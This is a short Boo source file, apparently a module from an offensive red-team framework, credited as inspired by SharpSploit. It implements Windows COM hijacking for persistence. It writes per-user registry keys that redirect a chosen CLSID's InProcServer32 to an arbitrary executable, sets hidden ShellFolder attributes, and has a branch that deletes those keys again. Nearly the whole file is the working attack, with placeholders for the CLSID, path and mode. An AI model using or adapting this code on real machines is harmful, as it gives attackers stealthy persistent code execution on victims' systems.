/*
    This module is inspired from SharpSploit (https://github.com/cobbr/SharpSploit)
*/
import System
import Microsoft.Win32

public static def Main():
    clsid = 'CLSD'
    executablepath = `EXECUTABLE_PATH`
    status = "STATUS"

    if not clsid or not executablepath or not status:
        print "[X] ERROR: CLSID, ExecutablePath ans Status must all be provided"
        return

    if status == "add":
        try:
            key as RegistryKey
            key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InProcServer32")
            key.SetValue("", executablepath)
            key.SetValue("ThreadingModel", "Apartment")
            key.SetValue("LoadWithoutCOM", "")

            key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\ShellFolder")
            key.SetValue("HideOnDesktop", "")
            key.SetValue("Attributes", 0xf090013d cast int, RegistryValueKind.DWord)
            print "[*] COM hijack succeeded for CLSID: " + clsid + " with ExecutablePath: " + executablepath
        except e:
            print "[X] ERROR doing COM Hijack for CLSID: " + clsid + " with ExecutablePath: " + executablepath + "\r\n" + e
    elif status == "remove":
        try:
            Registry.CurrentUser.DeleteSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InProcServer32")
            Registry.CurrentUser.DeleteSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\ShellFolder")
            Registry.CurrentUser.DeleteSubKey("Software\\Classes\\CLSID\\{" + clsid + "}")
            print "[*] COM hijack succeeded for CLSID: " + clsid + " with ExecutablePath: " + executablepath
        except e:
            print "[X] ERROR removing COM Hijack for CLSID: " + clsid + " with ExecutablePath: " + executablepath + "\r\n" + e
    else:
        print "Unsupported Status"
